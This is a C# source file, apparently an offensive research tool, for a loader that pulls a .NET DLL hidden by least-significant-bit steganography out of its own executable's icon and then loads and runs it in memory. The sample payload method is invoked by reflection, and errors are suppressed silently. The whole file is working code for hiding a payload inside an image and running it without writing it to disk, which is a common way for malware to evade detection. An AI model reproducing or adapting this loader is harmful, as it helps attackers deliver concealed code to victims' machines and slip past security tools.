using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using TsudaKageyu; // IconExtractor.dll

/**
    Author: Aleph
    Description: This program extracts from the icon of the executable itself a .NET DLL with the scheme 
    that can be seen in the example payload “assembly”. 

    Later it loads it in memory and executes it taking advantage of the features of .NET.
*/

class Program
{
    static void loadDLL(byte[] stegodll)
    {
        try
        {
            // Load assembly (DLL) from bytes
            Assembly assembly = Assembly.Load(stegodll);

            Type t = assembly.GetType("Iconic.Program");

            // Get the method information for "payload"
            var methodInfo = t.GetMethod("payload", new Type[] { typeof(string) });
            if (methodInfo == null)
            {
                throw new Exception("No such method exists.");
            }

            // Create an instance of the class without parameters
            object o = Activator.CreateInstance(t);

            // Prepare parameters for the method "payload"
            object[] parameters = new object[1];
            parameters[0] = "Hi from Iconic!";   // 'text' parameter

            // Invoke the method on the created object
            var r = methodInfo.Invoke(o, parameters);
        }
        catch (Exception ex)
        {
            return;
        }
    }

    /**
        @Ale: In this case it gets all the data from the image; this is a problem because it is loading data that may belong to 
        the original image. However, since in my case I am loading a DLL by the format of the PE structure itself, 
        there should not be a problem.

        In any case, this must be optimized.
    */

    public static byte[] ExtractDataFromImage(Bitmap bitmap)
    {
        // We use a MemoryStream to store the extracted data.
        using (MemoryStream ms = new MemoryStream())
        {

            int bitIndex = 0;
            byte currentByte = 0;

            // Iterate over image pixels
            for (int y = 0; y < bitmap.Height; y++)
            {
                for (int x = 0; x < bitmap.Width; x++)
                {
                    Color pixelColor = bitmap.GetPixel(x, y);

                    currentByte = (byte)((currentByte << 1) | (pixelColor.R & 1));
                    bitIndex++;
                    if (bitIndex % 8 == 0)
                    {
                        ms.WriteByte(currentByte);
                        currentByte = 0;
                    }

                    currentByte = (byte)((currentByte << 1) | (pixelColor.G & 1));
                    bitIndex++;
                    if (bitIndex % 8 == 0)
                    {
                        ms.WriteByte(currentByte);
                        currentByte = 0;
                    }

                    currentByte = (byte)((currentByte << 1) | (pixelColor.B & 1));
                    bitIndex++;
                    if (bitIndex % 8 == 0)
                    {
                        ms.WriteByte(currentByte);
                        currentByte = 0;
                    }
                }
            }
            return ms.ToArray();
        }
    }

    static void Main(string[] args)
    {

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern uint GetModuleFileName(IntPtr hModule, [Out] char[] lpFilename, uint nSize);

        IntPtr hModule = IntPtr.Zero;
        char[] buffer = new char[512];
        uint size = (uint)buffer.Length;

        // Call the API to get the executable path
        uint result = GetModuleFileName(hModule, buffer, size);

        if (result > 0)
        {
            string filePath = new string(buffer, 0, (int)result);
            
            // Icon icon = Icon.ExtractAssociatedIcon(filePath);
            // Problem above (commented line): when converting to Bitmap only the 32x32 is extracted

            IconExtractor ie = new IconExtractor(filePath);

            Icon icon0 = ie.GetIcon(0);

            if (icon0 != null)
            {
                Icon[] splitIcons = IconUtil.Split(icon0);
                Bitmap bitmap = splitIcons[splitIcons.Length - 1].ToBitmap();
                byte[] hidedll = ExtractDataFromImage(bitmap);
                loadDLL(hidedll);
            }

        }
        else
        {
            return;
        }     
    }
}
